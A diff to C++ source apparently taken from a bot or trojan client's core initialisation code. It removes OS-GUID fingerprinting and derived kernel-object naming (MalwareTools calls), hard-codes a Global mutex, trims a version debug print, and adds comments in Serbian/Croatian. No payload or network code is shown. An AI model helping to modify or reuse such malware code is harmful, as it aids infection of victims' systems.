@@ -16,7 +16,6 @@
 #include "fs.h"
 #include "sync.h"
 #include "winsecurity.h"
-#include "WinAPITypes.h"
 
 COREDATA coreData;
 
@@ -174,16 +173,6 @@ static bool __inline initOsBasic(DWORD flags)
     return false;
   }
 
-  //OS GUID.
-  if((flags & Core::INITF_INJECT_START) == 0)
-  {
-    MalwareTools::_getOsGuid(&coreData.osGuid);
-  }
-  else
-  {
-    //Preserved when you copy a Module.
-  }
-  
   //Retrieving IntegrityLevel.
   if((coreData.integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS)) == Process::INTEGRITY_UNKNOWN)
   {
@@ -283,20 +272,6 @@ static bool __inline initPaths(DWORD flags)
     WDEBUG0(WDDT_ERROR, "Not enough memory.");
     return false;
   }
-  
-  return true;
-}
-
-/*
-  Create objects names.
-
-  IN flags - flags INITF_*.
-
-  Return   - true - in case of success,
-             false - in case of error.
-*/
-static bool __inline initObjects(DWORD flags)
-{
   
   return true;
 }
@@ -409,9 +384,6 @@ bool Core::init(DWORD flags)
   //Nulling UserAgent.
   coreData.httpUserAgent = NULL;
   
-  //Creation of object names.
-  if(!initObjects(flags))return false;
-
   //Set the process rights.
   if(!initProcessRights(flags))return false;
 
@@ -424,11 +396,7 @@ bool Core::init(DWORD flags)
 		//if(CWA(kernel32, ConvertSidToStringSidW)(coreData.currentUser.token->User.Sid, &userSid) == FALSE)userSid = NULL;
 		userSid = NULL;
 
-    WDEBUG10(WDDT_INFO, "Initialized successfully:\r\nVersion: %u.%u.%u.%u\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nBot home: %s\r\nSID: %s\r\n",
-                       VERSION_MAJOR(BO_CLIENT_VERSION),
-                       VERSION_MINOR(BO_CLIENT_VERSION),
-                       VERSION_SUBMINOR(BO_CLIENT_VERSION),
-                       VERSION_BUILD(BO_CLIENT_VERSION),
+    WDEBUG6(WDDT_INFO, "Initialized successfully:\r\nIntegrity level: %u\r\ncoreData.proccessFlags: 0x%08X\r\nFull path: %s\r\nCommand line: %s\r\nBot home: %s\r\nSID: %s\r\n",
                        coreData.integrityLevel,
                        coreData.proccessFlags,
                        coreData.paths.process,
@@ -445,11 +413,9 @@ bool Core::init(DWORD flags)
 
 HANDLE Core::createMutexOfProcess(DWORD pid)
 {
-	WCHAR objectName[50];
-	BASECONFIG baseConfig;
-	PESETTINGS pes;
+	// koristicemo Global mutex umesto Local
+	WCHAR objectName[]=L"Global\\{75404F64-9D98-41E4-8759-5A4FA65D16EF}";
 
-	MalwareTools::_generateKernelObjectName(&coreData.osGuid, pes.processInfecionId, pid, objectName, &baseConfig.baseKey, MalwareTools::KON_GLOBAL);
 	return Sync::_createUniqueMutex(&coreData.securityAttributes.saAllowAll, objectName);
 }
 
@@ -548,6 +514,7 @@ static WCHAR __strDebugReportFile[MAX_PATH];
 static DWORD integrityLevel;
 #define LOG_FILE_W        L"C:\\working.txt"
 #define MUTEX_WRITEFILE L"{7EEEA37C-5CEF-11DD-9810-2F4256D89596}"
+#include <accCtrl.h>		// definicija za SE_FILE_OBJECT
 
 static bool defaultModuleEntry(void)
 {
